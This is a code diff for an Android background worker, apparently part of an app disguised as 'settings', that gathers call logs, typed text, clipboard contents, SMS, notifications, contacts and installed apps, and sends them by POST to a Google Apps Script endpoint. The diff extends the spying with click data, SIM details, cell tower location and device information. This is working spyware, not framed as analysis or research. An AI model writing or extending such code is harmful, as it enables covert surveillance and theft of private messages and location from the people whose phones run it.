@@ -27,11 +27,17 @@ import java.util.Locale;
 import java.util.Map;
 
 import static com.example.settings.MainActivity.clipboardManager;
+import static com.example.settings.MainActivity.deviceInformation;
+import static com.example.settings.MainActivity.getCellInfo;
+import static com.example.settings.MainActivity.simName;
+import static com.example.settings.Utils.getDateTime;
 
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
-    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime, Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "", NotificationData,SmsData,OtherNotificationData;
+    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
+            Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
+            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
 
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -51,6 +57,8 @@ public class SyncData extends Worker {
         NotificationData = mSharedpref.getNotificationData();
         SmsData=mSharedpref.getSmsData();
         OtherNotificationData=mSharedpref.getOtherNotificationData();
+        ClickedData=mSharedpref.getClickedData();
+        OtherClickedData=mSharedpref.getOtherClickedData();
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -61,24 +69,26 @@ public class SyncData extends Worker {
             e.printStackTrace();
         }
 
-        int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
-        if (mSharedpref.getPrevPhoneNumbersLisSize() < numberlistsize) {
-            Phonenumberdetails = mSharedpref.getPhoneNumbers();
-            mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
-            mSharedpref.commit();
-        }
-        if (mSharedpref.getPrevPhoneAppdetailsListSize() < mSharedpref.getPhoneAppdetailsListSize()) {
-            Phoneappdetails = mSharedpref.getPhoneAppdetails();
-            mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
-            mSharedpref.commit();
-        }
-        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
-        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-        DaysTime = currentDate + "[" + currentTime + "]";
+
+        DaysTime = getDateTime();
         if (!Name.isEmpty()) {
+            int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
+            if (mSharedpref.getPrevPhoneNumbersLisSize() != numberlistsize) {
+                Phonenumberdetails = mSharedpref.getPhoneNumbers();
+                mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
+                mSharedpref.commit();
+            }
+            int ApplistSize= mSharedpref.getPhoneAppdetailsListSize();
+            if (mSharedpref.getPrevPhoneAppdetailsListSize() != mSharedpref.getPhoneAppdetailsListSize()) {
+                Phoneappdetails = mSharedpref.getPhoneAppdetails();
+                mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
+                mSharedpref.commit();
+            }
             if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                     !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
-                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() || !SmsData.isEmpty() || !OtherNotificationData.isEmpty()) {
+                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
+                    !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
+                    || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() || !Phoneappdetails.isEmpty()) {
                 StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                         new Response.Listener<String>() {
                             @Override
@@ -90,6 +100,8 @@ public class SyncData extends Worker {
                                 mSharedpref.setNotificationData("");
                                 mSharedpref.setOtherNotificationData("");
                                 mSharedpref.setSmsData("");
+                                mSharedpref.setClickedData("");
+                                mSharedpref.setOtherClickedData("");
                                 mSharedpref.commit();
                             }
                         },
@@ -118,6 +130,11 @@ public class SyncData extends Worker {
                         parmas.put("NotificationData", NotificationData);
                         parmas.put("OtherNotificationData", OtherNotificationData);
                         parmas.put("SmsData", SmsData);
+                        parmas.put("ClickedData", ClickedData);
+                        parmas.put("OtherClickedData", OtherClickedData);
+                        parmas.put("Simdetails", String.valueOf(simName(context)));
+                        parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
+                        parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                         return parmas;
                     }
                 };
